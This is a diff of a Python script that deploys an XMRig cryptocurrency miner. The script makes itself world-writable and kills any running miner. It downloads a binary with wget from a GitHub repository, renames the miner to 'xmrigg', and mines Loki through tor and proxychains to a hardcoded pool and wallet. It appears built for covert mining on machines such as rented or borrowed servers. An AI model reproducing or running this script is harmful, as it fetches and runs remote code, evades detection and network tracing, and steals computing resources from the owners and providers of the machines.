@@ -9,7 +9,7 @@ import multiprocessing
 import ast
 useproxy = 0
 os.system('chmod 777 ' + __file__)
-program = 'xmrig'
+program = 'xmrigg'
 os.system('pkill ' + program)
 cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
@@ -25,7 +25,8 @@ try:
     os.system('make install')
     os.system('make install-config')
     if os.path.isfile('/usr/local/bin/' + program) == False:
-        os.system('wget https://github.com/nhatquanglan/daovps/raw/master/xmrig_tls/' + program)
+        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
+                        
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
@@ -33,9 +34,6 @@ try:
         time.sleep (2)
 except:
     pass
-#os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
-#os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
 os.system('tor &')
 time.sleep(60)
-#os.system ('proxychains4 ' + program + ' --donate-level 1 -o stratum+tcp://66.42.53.57:442 --tls -t ' + str(cores))
 os.system ('proxychains4 ' + program + ' --donate-level 1 -o loki.herominers.com:10114 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p x -a rx/loki -k --tls -t ' + str(cores))
